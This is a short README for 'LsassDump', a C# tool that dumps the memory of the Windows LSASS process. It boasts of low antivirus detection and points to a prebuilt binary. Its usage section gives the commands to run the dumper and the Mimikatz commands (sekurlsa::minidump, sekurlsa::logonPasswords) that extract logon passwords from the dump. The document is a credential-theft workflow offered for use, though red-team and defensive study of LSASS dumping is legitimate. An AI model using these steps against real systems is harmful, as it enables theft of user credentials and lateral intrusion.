# LsassDump
Simple LSASS Dumper created using C# as an alternative to using Mimikatz memory dumper

NOTE: You still need Mimikatz installed to read the dumped data. This program only dumps the data.

Antiscan.me results: Detected by 1/26 when running against the unobfuscated executable build.

# Usage
If you don't want to build it by yourself, use the prebuild binary.

```
.\Katzensprung.exe
LSASS process memory dumped to: mini.dmp
```

Here are the commands you will need to use in Mimikatz to access the dumped data:

```
> mimikatz # This will start the program
mimikatz$ sekurlsa::minidump <FileName>
mimikatz$ sekurlsa::logonPasswords
```
